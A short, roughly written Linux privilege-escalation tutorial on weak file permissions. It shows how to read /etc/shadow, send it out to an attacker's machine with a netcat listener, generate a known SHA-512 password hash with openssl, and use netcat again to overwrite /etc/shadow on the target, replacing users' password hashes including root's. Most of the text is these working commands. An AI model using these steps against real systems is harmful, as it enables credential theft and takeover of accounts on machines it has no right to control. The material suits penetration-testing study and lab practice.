### Weak File Permission
Suppose I have permission to read and write sensitive files like /etc/passwd(contains username),/etc/shadow(contains password hash)
then I can read the users and password of root or others users.
#### File permission check command
-> ls -al
#### Take advantages of write file.
We can replace the hash of any users to our known password.To do that we can copy the /etc/shadow file and after modifying we can also placed the file again.
#### Coping file from target to host machine.
We use netcat listener in target 
-> nc -nvlp 4444 < /etc/shadow
In our host machine to start 
-> nc ip_of_the_target 4444 >shadow
The above command copy a file name shadow.We can here modify the contain using vim and nano editor.

#### Making Hash
-> openssl passwd -6 hello
The above command make a hash for hello format SHA-512-based crypt.

#### Transfer the modify file into target
In our host machine we run the following command
-> nc ip_of_the_targer 4444 < shadow
In target machine
nc -nvlp 4444 > /etc/shadow



